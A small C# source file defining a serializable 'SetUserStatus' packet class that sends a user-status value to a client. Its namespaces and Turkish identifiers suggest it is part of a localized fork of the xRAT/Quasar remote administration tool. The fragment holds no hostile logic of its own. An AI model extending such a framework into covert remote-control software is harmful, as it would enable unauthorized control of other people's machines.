using System;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.Enumlar2;

namespace xServer.KuuhakuCekirdek.Paketler.ClientPaketleri
{
    [Serializable]
    public class SetUserStatus : IPacket
    {
        public KullanıcıDurumu Message { get; set; }

        public SetUserStatus()
        {
        }

        public SetUserStatus(KullanıcıDurumu message)
        {
            Message = message;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}